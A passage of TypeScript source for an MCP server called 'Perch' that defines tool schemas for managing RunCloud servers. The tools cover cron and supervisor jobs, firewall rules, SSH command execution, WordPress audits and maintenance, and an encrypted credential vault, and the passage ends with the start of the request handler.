        dayOfMonth: { type: "string", description: "e.g. *" },
        month: { type: "string", description: "e.g. *" },
        dayOfWeek: { type: "string", description: "e.g. * or 1" },
      },
      required: ["serverId","label","username","command","minute","hour","dayOfMonth","month","dayOfWeek"],
    },
  },
  {
    name: "delete_cronjob",
    description: "Delete a cron job.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, jobId: { type: "number" } },
      required: ["serverId", "jobId"],
    },
  },
  {
    name: "rebuild_cronjobs",
    description: "Rebuild all cron jobs on a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },

  // ── SUPERVISOR ────────────────────────────────────────────────────────────
  {
    name: "list_supervisor_jobs",
    description: "List all supervisor jobs on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_supervisor_job",
    description: "Get a specific supervisor job.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, supervisorId: { type: "number" } },
      required: ["serverId", "supervisorId"],
    },
  },
  {
    name: "get_supervisor_status",
    description: "Get running status (PID, uptime) of all supervisor jobs.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "list_supervisor_binaries",
    description: "List available binary paths for supervisor jobs (php, node, etc.).",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "create_supervisor_job",
    description: "Create a supervisor background job.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        label: { type: "string" },
        username: { type: "string" },
        command: { type: "string" },
        numprocs: { type: "number" },
        autoRestart: { type: "boolean" },
        autoStart: { type: "boolean" },
        binary: { type: "string", description: "e.g. /usr/bin/node" },
        directory: { type: "string" },
      },
      required: ["serverId", "label", "username", "command", "numprocs"],
    },
  },
  {
    name: "reload_supervisor_job",
    description: "Reload a supervisor job.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, supervisorId: { type: "number" } },
      required: ["serverId", "supervisorId"],
    },
  },
  {
    name: "rebuild_supervisor_jobs",
    description: "Rebuild all supervisor jobs on a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "delete_supervisor_job",
    description: "Delete a supervisor job.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, supervisorId: { type: "number" } },
      required: ["serverId", "supervisorId"],
    },
  },

  // ── FIREWALL ──────────────────────────────────────────────────────────────
  {
    name: "list_firewall_rules",
    description: "List all firewall rules for a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, page: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "create_firewall_rule",
    description: "Create a firewall rule. Use type=global to open to all, type=rich to restrict to an IP/CIDR.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        type: { type: "string", enum: ["global","rich"] },
        port: { type: "string", description: "e.g. 80 or 8000-8999" },
        protocol: { type: "string", enum: ["tcp","udp"] },
        ipAddress: { type: "string" },
        firewallAction: { type: "string", enum: ["accept","reject"] },
      },
      required: ["serverId", "type", "port", "protocol"],
    },
  },
  {
    name: "deploy_firewall_rules",
    description: "Apply all pending firewall rules to the server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "delete_firewall_rule",
    description: "Delete a firewall rule.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, firewallId: { type: "number" } },
      required: ["serverId", "firewallId"],
    },
  },
  {
    name: "list_fail2ban_blocked_ips",
    description: "List IPs currently blocked by Fail2Ban.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "unblock_fail2ban_ip",
    description: "Remove an IP from the Fail2Ban block list.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, ip: { type: "string" } },
      required: ["serverId", "ip"],
    },
  },

  // ── EXTERNAL APIs ─────────────────────────────────────────────────────────
  {
    name: "list_external_apis",
    description: "List 3rd party API keys (Cloudflare, DigitalOcean, Linode).",
    inputSchema: {
      type: "object",
      properties: { search: { type: "string" }, page: { type: "number" } },
      required: [],
    },
  },
  {
    name: "get_external_api",
    description: "Get a specific 3rd party API key.",
    inputSchema: {
      type: "object",
      properties: { apiId: { type: "number" } },
      required: ["apiId"],
    },
  },
  {
    name: "create_external_api",
    description: "Add a 3rd party API key (used for DNS-based SSL, etc.).",
    inputSchema: {
      type: "object",
      properties: {
        label: { type: "string" },
        service: { type: "string", enum: ["cloudflare","linode","digitalocean"] },
        username: { type: "string", description: "Email (required for Cloudflare)" },
        secret: { type: "string" },
      },
      required: ["label", "service", "secret"],
    },
  },
  {
    name: "update_external_api",
    description: "Update a 3rd party API key.",
    inputSchema: {
      type: "object",
      properties: {
        apiId: { type: "number" },
        label: { type: "string" },
        username: { type: "string" },
        secret: { type: "string" },
      },
      required: ["apiId", "label", "username", "secret"],
    },
  },
  {
    name: "delete_external_api",
    description: "Delete a 3rd party API key.",
    inputSchema: {
      type: "object",
      properties: { apiId: { type: "number" } },
      required: ["apiId"],
    },
  },

  // ── STATIC DATA ───────────────────────────────────────────────────────────
  {
    name: "list_timezones",
    description: "List all available timezones.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "list_database_collations",
    description: "List all available database collations.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "list_script_installers",
    description: "List available PHP script installers (WordPress, Joomla, Drupal, etc.).",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "list_ssl_protocols",
    description: "List available SSL protocols and their IDs for use when installing SSL.",
    inputSchema: {
      type: "object",
      properties: {
        webServer: { type: "string", description: "Web server type (default: nginx)" },
      },
      required: [],
    },
  },

  // ── SSH EXECUTION ─────────────────────────────────────────────────────────
  {
    name: "ssh_run_command",
    description: [
      "SSH into a server and run any shell command. Gets the server IP automatically from RunCloud.",
      "Workflow: first use change_system_user_password to set a known password, then call this.",
      "Returns stdout, stderr, and exit code.",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number", description: "RunCloud server ID (IP is fetched automatically)" },
        username: { type: "string", description: "System user to SSH as" },
        password: { type: "string", description: "Password for the system user" },
        command: { type: "string", description: "Shell command to run" },
        timeoutSeconds: { type: "number", description: "Timeout in seconds (default 30)" },
      },
      required: ["serverId", "username", "password", "command"],
    },
  },
  {
    name: "ssh_wp_cli",
    description: [
      "Run a WP-CLI command on a WordPress site via SSH.",
      "Automatically resolves server IP, navigates to the web app root, and runs wp-cli.",
      "Example wpcliCommand: 'cache flush', 'plugin list', 'user list', 'core update'",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string", description: "System user that owns the web app" },
        password: { type: "string" },
        appPath: { type: "string", description: "Full path to WordPress root, e.g. /home/user/myapp/public" },
        wpcliCommand: { type: "string", description: "wp-cli command without the 'wp' prefix" },
      },
      required: ["serverId", "username", "password", "appPath", "wpcliCommand"],
    },
  },
  {
    name: "ssh_artisan",
    description: [
      "Run a Laravel artisan command on a web app via SSH.",
      "Example artisanCommand: 'cache:clear', 'migrate', 'queue:restart', 'optimize'",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        appPath: { type: "string", description: "Full path to Laravel app root, e.g. /home/user/myapp" },
        artisanCommand: { type: "string", description: "artisan command without the 'php artisan' prefix" },
      },
      required: ["serverId", "username", "password", "appPath", "artisanCommand"],
    },
  },
  {
    name: "ssh_tail_log",
    description: "SSH into a server and read the last N lines of any log file.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        logPath: { type: "string", description: "Full path to log file, e.g. /var/log/nginx/error.log or /home/user/myapp/storage/logs/laravel.log" },
        lines: { type: "number", description: "Number of lines to read (default 100)" },
      },
      required: ["serverId", "username", "password", "logPath"],
    },
  },

  // ── SEARCH ────────────────────────────────────────────────────────────────
  {
    name: "find_webapp_by_domain",
    description: "Search ALL servers for a web app matching a domain name. Returns the server and webapp details. Useful when you know the domain but not which server it's on.",
    inputSchema: {
      type: "object",
      properties: { domain: { type: "string", description: "Domain or partial domain to search for" } },
      required: ["domain"],
    },
  },
  {
    name: "webapp_inventory",
    description: "List every web application across ALL servers in one call. Shows server name, app name, domain, PHP version, stack mode, and SSL status. Great for a full account overview.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },

  // ── HEALTH & MONITORING ───────────────────────────────────────────────────
  {
    name: "server_health_score",
    description: "Calculate a 0–100 health score for a server based on memory usage, disk usage, load average, and service status. Also returns actionable warnings.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "multi_server_dashboard",
    description: "Get a dashboard summary of ALL servers: name, IP, online status, health score, webapp count, and disk/memory usage — all in one call.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "failed_services_scan",
    description: "Scan all servers and return only services that are stopped or not running. Useful for quick incident detection across your entire account.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },

  // ── SECURITY ──────────────────────────────────────────────────────────────
  {
    name: "security_audit",
    description: "Full security snapshot for a server in one call: firewall rules, SSH public keys, Fail2Ban blocked IPs, and external API keys — all fetched in parallel.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "open_ports_report",
    description: "List only firewall rules open to ALL IPs (0.0.0.0) on a server. Highlights exposure — useful for security reviews before going live.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },

  // ── DEPLOYMENT ────────────────────────────────────────────────────────────
  {
    name: "deploy_and_verify",
    description: "Force a Git deploy and then immediately check the webapp status and tail the last 50 lines of action logs to confirm success. One command for the full deploy cycle.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        gitId: { type: "number" },
      },
      required: ["serverId", "webAppId", "gitId"],
    },
  },

  // ── WORDPRESS SSH TOOLS ───────────────────────────────────────────────────
  {
    name: "wp_health_check",
    description: "Run a full WordPress health check via SSH: wp-cli info, core checksum verification, active plugin count, and scheduled cron events. Returns a health summary.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        appPath: { type: "string", description: "Full path to WordPress root, e.g. /home/user/myapp/public" },
      },
      required: ["serverId", "username", "password", "appPath"],
    },
  },
  {
    name: "wp_outdated_plugins",
    description: "List WordPress plugins that have updates available via SSH + WP-CLI. Shows plugin name, current version, and new version.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        appPath: { type: "string" },
      },
      required: ["serverId", "username", "password", "appPath"],
    },
  },
  {
    name: "wp_admin_audit",
    description: "List all WordPress admin users via SSH + WP-CLI. Use to detect unwanted admin accounts — a common indicator of compromise.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        appPath: { type: "string" },
      },
      required: ["serverId", "username", "password", "appPath"],
    },
  },
  {
    name: "wp_clear_all_caches",
    description: "Clear all caches on a WordPress site via SSH: WP object cache, OPcache reset, and optionally Redis FLUSHDB. One command to fix stale content issues.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        appPath: { type: "string" },
        flushRedis: { type: "boolean", description: "Also flush Redis (default false)" },
      },
      required: ["serverId", "username", "password", "appPath"],
    },
  },

  // ── PERFORMANCE (SSH) ─────────────────────────────────────────────────────
  {
    name: "server_load_report",
    description: "SSH into a server and return a formatted performance report: uptime + load averages, memory usage (free -h), disk usage (df -h), and top 5 memory-consuming processes.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
      },
      required: ["serverId", "username", "password"],
    },
  },
  {
    name: "nginx_top_ips",
    description: "SSH into a server and return the top 15 IPs by request count from the nginx access log. Useful for detecting traffic spikes, scrapers, or attackers.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        logPath: { type: "string", description: "Nginx access log path (default: /var/log/nginx/access.log)" },
      },
      required: ["serverId", "username", "password"],
    },
  },
  {
    name: "php_error_summary",
    description: "SSH into a server and return a summary of PHP errors from a log file: total count, last 20 errors, and grouped error types. Useful for debugging without log access.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
        logPath: { type: "string", description: "PHP error log path, e.g. /home/user/myapp/logs/php-error.log" },
      },
      required: ["serverId", "username", "password", "logPath"],
    },
  },

  // ── COMPOUND TOOLS ────────────────────────────────────────────────────────
  {
    name: "server_overview",
    description: [
      "Fetches everything about a server in one call: basic info, health, hardware, services, and web apps.",
      "All requests run in parallel. Returns a combined summary.",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "webapp_full_info",
    description: [
      "Fetches all details about a web application in one call:",
      "settings, domains, SSL, git info — all in parallel.",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
      },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "all_servers_health",
    description: "List all servers and their current health (memory, disk, load) in one call.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "ssl_expiry_check",
    description: "Check SSL expiry dates for all web apps on a server. Flags anything expiring within 30 days.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "wordpress_quickstart",
    description: [
      "Full WordPress setup in one call: creates a system user, database, database user, grants access,",
      "creates the web application, and installs WordPress — all sequentially.",
      "Returns a complete summary of everything created.",
    ].join(" "),
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        appName: { type: "string", description: "Web app name (no spaces)" },
        domainName: { type: "string", description: "Primary domain" },
        phpVersion: { type: "string", description: "PHP version e.g. php82rc" },
        sysUsername: { type: "string", description: "System user to create/use" },
        sysPassword: { type: "string", description: "System user password" },
        dbName: { type: "string", description: "Database name" },
        dbUsername: { type: "string", description: "Database user" },
        dbPassword: { type: "string", description: "Database password" },
        timezone: { type: "string", description: "e.g. Asia/Kolkata (default UTC)" },
      },
      required: ["serverId","appName","domainName","phpVersion","sysUsername","sysPassword","dbName","dbUsername","dbPassword"],
    },
  },
  // ── SERVER MONITOR & SELF-HEAL (SSH-direct, no RunCloud API key needed) ──────

  {
    name: "ssh_server_status",
    description: "Comprehensive server health check via SSH — RAM, disk, CPU, nginx/nginx-rc status, orphan processes, top memory consumers. No RunCloud API key needed.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string", description: "Server IP or hostname" },
        username: { type: "string", description: "SSH username" },
        password: { type: "string", description: "SSH password" },
      },
      required: ["host", "username", "password"],
    },
  },
  {
    name: "ssh_smart_fix",
    description: "Auto-detect and fix server issues via SSH: nginx/nginx-rc down, orphan processes, high memory, disk pressure, crashed PM2 services. Reports every issue found and fixed.",
    inputSchema: {
      type: "object",
      properties: {
        host:         { type: "string", description: "Server IP or hostname" },
        username:     { type: "string", description: "SSH username" },
        password:     { type: "string", description: "SSH password" },
        nginxService: { type: "string", description: "nginx-rc (RunCloud) or nginx (standard). Default: auto-detect" },
      },
      required: ["host", "username", "password"],
    },
  },
  {
    name: "ssh_restart_service",
    description: "Restart a named service via SSH. Auto-detects nginx-rc (RunCloud) vs nginx. Also handles n8n, pm2, any systemd service.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        service:  { type: "string", description: "Service to restart: nginx, n8n, pm2, mysql, redis, or any systemd service name" },
      },
      required: ["host", "username", "password", "service"],
    },
  },
  {
    name: "ssh_kill_orphans",
    description: "Find and kill orphan processes (PPID=1, parent died) via SSH. Safe — skips init, systemd, dbus. Optionally filter by process name.",
    inputSchema: {
      type: "object",
      properties: {
        host:        { type: "string" },
        username:    { type: "string" },
        password:    { type: "string" },
        dryRun:      { type: "boolean", description: "List orphans without killing. Default: true" },
        processName: { type: "string",  description: "Only target orphans matching this name, e.g. supergateway" },
      },
      required: ["host", "username", "password"],
    },
  },
  {
    name: "ssh_disk_cleanup",
    description: "Find large log files on a server and optionally clear them to free disk space via SSH.",
    inputSchema: {
      type: "object",
      properties: {
        host:      { type: "string" },
        username:  { type: "string" },
        password:  { type: "string" },
        dryRun:    { type: "boolean", description: "Show what would be cleared without doing it. Default: true" },
        minSizeMB: { type: "number",  description: "Min file size in MB to consider. Default: 50" },
      },
      required: ["host", "username", "password"],
    },
  },
  {
    name: "ssh_check_ports",
    description: "List all listening ports on a server via SSH with PID and process name. Optionally filter to specific ports.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        ports:    { type: "array", items: { type: "number" }, description: "Specific ports to check, e.g. [80,443,3000]. Empty = all." },
      },
      required: ["host", "username", "password"],
    },
  },
  {
    name: "telegram_send_alert",
    description: "Send a message to a Telegram chat. Use for custom monitoring alerts, notifications, or server status updates. Supports Markdown and optional action buttons.",
    inputSchema: {
      type: "object",
      properties: {
        botToken:      { type: "string",  description: "Telegram bot token from @BotFather" },
        chatId:        { type: "string",  description: "Telegram chat ID" },
        message:       { type: "string",  description: "Message to send (Markdown supported)" },
        includeButtons:{ type: "boolean", description: "Add standard server action buttons. Default: false" },
      },
      required: ["botToken", "chatId", "message"],
    },
  },

  // ── PERCH INTELLIGENCE TOOLS ──────────────────────────────────────────────
  // All /perch commands live here. SSH auth required for most.

  {
    name: "perch_brain",
    description: "Show what Perch has learned across all servers and webapps. Returns a summary of the knowledge base: servers, webapps, top recurring problems, vulnerable plugins across all sites.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "perch_webapp_history",
    description: "Show the full problem + fix history for a specific webapp/domain.",
    inputSchema: {
      type: "object",
      properties: {
        domain: { type: "string", description: "Domain name of the webapp (e.g. mysite.com)" },
      },
      required: ["domain"],
    },
  },
  {
    name: "perch_detect_webapp",
    description: "Detect the type of webapp running on a server path (WordPress, Laravel, Node, static, etc.).",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string", description: "Server IP or hostname" },
        username: { type: "string", description: "SSH username" },
        password: { type: "string", description: "SSH password (or use privateKey)" },
        privateKey: { type: "string", description: "SSH private key PEM string (alternative to password)" },
        webroot:  { type: "string", description: "Absolute path to webapp root (e.g. /home/user/public_html)" },
      },
      required: ["host", "username", "webroot"],
    },
  },

  // ── WORDPRESS: DATABASE ───────────────────────────────────────────────────
  {
    name: "perch_wp_db_audit",
    description: "Deep WordPress database health check. Checks autoloaded data size, expired transients, orphaned postmeta, WooCommerce orphaned sessions, post revisions, and table fragmentation. Returns friendly diagnosis with savings estimates.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string", description: "SSH username" },
        password: { type: "string" },
        privateKey: { type: "string", description: "SSH private key PEM (alternative to password)" },
        wpPath:   { type: "string", description: "WordPress installation path (e.g. /home/user/public_html)" },
        wpUser:   { type: "string", description: "System user that owns the WordPress install" },
        dbName:   { type: "string", description: "MySQL database name" },
        domain:   { type: "string", description: "Domain (used for logging to brain)" },
      },
      required: ["host", "username", "wpPath", "wpUser", "dbName"],
    },
  },
  {
    name: "perch_wp_db_clean",
    description: "Clean expired transients and orphaned WooCommerce sessions from WordPress database. Safe — only removes expired/orphaned data. Returns how much was deleted and space saved.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
      },
      required: ["host", "username", "wpPath", "wpUser"],
    },
  },

  // ── WORDPRESS: PLUGINS ────────────────────────────────────────────────────
  {
    name: "perch_wp_plugins",
    description: "Full WordPress plugin audit. Lists all plugins (active + inactive), checks for available updates, scans for known vulnerabilities via Wordfence Intelligence free API, and flags abandoned plugins (no updates in 2+ years).",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        domain:   { type: "string", description: "Domain (used for logging)" },
      },
      required: ["host", "username", "wpPath", "wpUser"],
    },
  },
  {
    name: "perch_wp_plugin_update",
    description: "Update a specific WordPress plugin via WP-CLI. Returns old version, new version, and output.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        slug:     { type: "string", description: "Plugin slug to update (e.g. contact-form-7)" },
      },
      required: ["host", "username", "wpPath", "wpUser", "slug"],
    },
  },
  {
    name: "perch_wp_plugin_deactivate",
    description: "Deactivate a specific WordPress plugin via WP-CLI. Use when a plugin is causing a fatal error or white screen.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        slug:     { type: "string", description: "Plugin slug to deactivate" },
      },
      required: ["host", "username", "wpPath", "wpUser", "slug"],
    },
  },

  // ── WORDPRESS: SECURITY ───────────────────────────────────────────────────
  {
    name: "perch_wp_security",
    description: "WordPress security hardening audit. Checks 12 server-level security items: wp-config permissions, admin username, xmlrpc.php, directory listing, wp-login rate limiting, debug.log exposure, file editor, WP version in headers, readme.html, SSL validity, uploads PHP execution, core checksum verification. Returns score 0–100 and grade A–F.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        domain:   { type: "string", description: "Domain for HTTP checks (e.g. mysite.com)" },
      },
      required: ["host", "username", "wpPath", "wpUser", "domain"],
    },
  },

  // ── WORDPRESS: BACKUP ─────────────────────────────────────────────────────
  {
    name: "perch_wp_backup",
    description: "Check WordPress backup health. Reports last backup time and age, backup file size, whether DB backup is included, remote destination reachability, retention policy, and next scheduled backup. Flags missing or incomplete backups.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        webroot:  { type: "string", description: "Webapp root path" },
        domain:   { type: "string" },
      },
      required: ["host", "username", "webroot", "domain"],
    },
  },

  // ── WORDPRESS: IMAGES ─────────────────────────────────────────────────────
  {
    name: "perch_wp_images_scan",
    description: "Scan WordPress uploads directory for image optimization opportunities. Returns total images, total size, estimated savings from lossless compression and WebP generation, largest files, and which optimization tools are installed.",
    inputSchema: {
      type: "object",
      properties: {
        host:       { type: "string" },
        username:   { type: "string" },
        password:   { type: "string" },
        privateKey: { type: "string" },
        uploadsPath: { type: "string", description: "Path to wp-content/uploads (e.g. /home/user/public_html/wp-content/uploads)" },
      },
      required: ["host", "username", "uploadsPath"],
    },
  },
  {
    name: "perch_wp_images_optimize",
    description: "Optimize WordPress images via CLI tools (jpegoptim, optipng, pngquant, cwebp). Lossless by default — no quality loss. Optionally generates WebP versions alongside originals. Returns images processed, MB saved, WebP files created.",
    inputSchema: {
      type: "object",
      properties: {
        host:        { type: "string" },
        username:    { type: "string" },
        password:    { type: "string" },
        privateKey:  { type: "string" },
        uploadsPath: { type: "string" },
        generateWebp: { type: "boolean", description: "Generate .webp alongside originals. Default: true" },
        dryRun:      { type: "boolean", description: "Estimate savings without optimizing. Default: false" },
      },
      required: ["host", "username", "uploadsPath"],
    },
  },

  // ── WORDPRESS: PERFORMANCE ────────────────────────────────────────────────
  {
    name: "perch_wp_perf",
    description: "WordPress performance snapshot. Checks PHP version + EOL status, memory limit vs usage, object cache (Redis/Memcached), page cache type, WP cron health + backlog, TTFB from localhost, DB connection, active plugin count. Returns recommendations.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        domain:   { type: "string" },
      },
      required: ["host", "username", "wpPath", "wpUser", "domain"],
    },
  },

  // ── INTELLIGENCE: search + undo + multi-server + self-update ─────────────
  {
    name: "perch_brain_search",
    description: "Full-text search across all logged problems and their root causes. Returns recent matches with type, cause, fix applied, and outcome. Use when asked 'what do you know about X' or 'have we seen Y before'.",
    inputSchema: {
      type: "object",
      properties: {
        query: { type: "string", description: "Search terms (FTS5 prefix matching applied)" },
        limit: { type: "number", description: "Max hits to return. Default 20" },
      },
      required: ["query"],
    },
  },
  {
    name: "perch_actions_log",
    description: "Show the last N destructive actions Perch has taken (plugin deactivations, file changes, service modifications). Includes undone status and timestamps. Use to audit what Perch did recently.",
    inputSchema: {
      type: "object",
      properties: {
        limit: { type: "number", description: "How many recent actions. Default 10" },
      },
      required: [],
    },
  },
  {
    name: "perch_undo",
    description: "Reverse the most recent confirmed destructive action (or a specific one by ID). Currently supports: re-activating a deactivated plugin. Returns what was undone or an error if the action is not undoable.",
    inputSchema: {
      type: "object",
      properties: {
        actionId: { type: "number", description: "Optional specific action ID. If omitted, undoes the most recent." },
        host:     { type: "string", description: "SSH host (only needed if the action requires reconnecting)" },
        username: { type: "string", description: "SSH username" },
        password: { type: "string" },
        privateKey: { type: "string" },
      },
      required: [],
    },
  },
  {
    name: "perch_multi_server_dashboard",
    description: "One-shot summary of all RunCloud-managed servers in your account: status, IP, online/offline, RAM/disk usage from RunCloud's stats endpoint. Returns a compact list ready to render as a Telegram message.",
    inputSchema: {
      type: "object",
      properties: {
        verbose: { type: "boolean", description: "Include CPU + load detail. Default: false (terse summary)" },
      },
      required: [],
    },
  },
  {
    name: "perch_self_update",
    description: "Pull the latest Perch source from origin/main, rebuild, and report what changed. Equivalent to running scripts/update.sh. Returns the commit count, version transition, and any notification side-effects.",
    inputSchema: {
      type: "object",
      properties: {
        dryRun: { type: "boolean", description: "Just check for updates without pulling. Default: false" },
      },
      required: [],
    },
  },

  // ── VAULT (encrypted credential storage) ─────────────────────────────────
  {
    name: "perch_vault_put",
    description: "Store an encrypted credential in the Perch vault. Encrypted with AES-256-GCM using PERCH_MASTER_KEY env var. Use for SSH passwords, API keys, etc. Never logs the value.",
    inputSchema: {
      type: "object",
      properties: {
        id:    { type: "string", description: "Vault key (e.g. 'ssh:production-1' or 'runcloud:apikey')" },
        value: { type: "string", description: "Secret value to encrypt and store" },
        label: { type: "string", description: "Optional human label" },
      },
      required: ["id", "value"],
    },
  },
  {
    name: "perch_vault_get",
    description: "Retrieve a decrypted credential from the Perch vault by ID. Requires PERCH_MASTER_KEY env var. WARNING: returned plaintext is redacted in logs but visible in tool response.",
    inputSchema: {
      type: "object",
      properties: {
        id: { type: "string", description: "Vault key to retrieve" },
      },
      required: ["id"],
    },
  },
  {
    name: "perch_vault_list",
    description: "List all credential IDs stored in the Perch vault. Does not return the values themselves — just the keys.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },
  {
    name: "perch_vault_delete",
    description: "Delete a credential from the Perch vault by ID.",
    inputSchema: {
      type: "object",
      properties: {
        id: { type: "string" },
      },
      required: ["id"],
    },
  },

  // ── WORDPRESS: ERROR DIAGNOSIS ────────────────────────────────────────────
  {
    name: "perch_wp_errors",
    description: "Diagnose WordPress PHP errors and white screens. Parses PHP error log, classifies errors by type and responsible plugin/theme, identifies the most likely root cause, and suggests a fix. Can detect plugin conflicts, memory exhaustion, fatal errors, and white screens.",
    inputSchema: {
      type: "object",
      properties: {
        host:     { type: "string" },
        username: { type: "string" },
        password: { type: "string" },
        privateKey: { type: "string" },
        wpPath:   { type: "string" },
        wpUser:   { type: "string" },
        domain:   { type: "string" },
        lines:    { type: "number", description: "Error log lines to analyze. Default: 200" },
      },
      required: ["host", "username", "wpPath", "wpUser", "domain"],
    },
  },
];

// ─── SERVER SETUP ─────────────────────────────────────────────────────────────

const server = new Server(
  { name: "perch", version: "2.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler(ListToolsRequestSchema, async () => ({ tools }));

// ─── TOOL HANDLER ─────────────────────────────────────────────────────────────

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args = {} } = request.params;
  const a = args as Record<string, unknown>;

  try {
    let result: unknown;

    switch (name) {

      // ── PING ────────────────────────────────────────────────────────────
      case "ping":
        result = await runcloudRequest("GET", "/ping");
        break;

      // ── SERVERS ─────────────────────────────────────────────────────────
      case "list_servers": {
        if (a.all) {
          result = await paginateAll("/servers" + (a.search ? `?search=${encodeURIComponent(a.search as string)}` : ""));
        } else {
          const p = new URLSearchParams();
          if (a.search) p.set("search", String(a.search));
          if (a.page) p.set("page", String(a.page));
          result = await runcloudRequest("GET", `/servers?${p}`);
        }
        break;
      }
      case "list_shared_servers": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        result = await runcloudRequest("GET", `/servers/shared?${p}`);
        break;
      }
      case "get_server":
        result = await runcloudRequest("GET", `/servers/${a.serverId}`);
        break;
      case "create_server": {
        const body: Record<string, unknown> = { name: a.name, ipAddress: a.ipAddress };
        if (a.provider) body.provider = a.provider;
        result = await runcloudRequest("POST", "/servers", body);
        break;
      }
